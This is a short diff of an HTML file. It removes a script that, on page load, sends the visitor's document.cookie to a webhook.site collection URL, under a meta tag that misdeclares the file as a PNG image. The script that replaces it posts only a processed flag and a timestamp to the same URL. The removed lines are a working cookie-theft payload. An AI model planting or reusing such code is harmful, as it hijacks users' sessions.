@@ -1,12 +1,13 @@
-<head>
-  <meta http-equiv="Content-Type" content="image/png">
-</head>
 <body>
-  <script>
-    navigator.sendBeacon(
-      "https://webhook.site/aac76a2b-98fc-4651-a334-9290195913b3?c="+encodeURIComponent(document.cookie),
-      new Blob([JSON.stringify({ from: "beacon" })], { type: "application/json" })
-    );
-  </script>
+<script>
+  // Do your processing here
+  const result = { processed: true, timestamp: Date.now() };
+
+  // Send result back to webhook.site
+  fetch("https://webhook.site/aac76a2b-98fc-4651-a334-9290195913b3", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(result),
+  });
+</script>
 </body>
-</html>
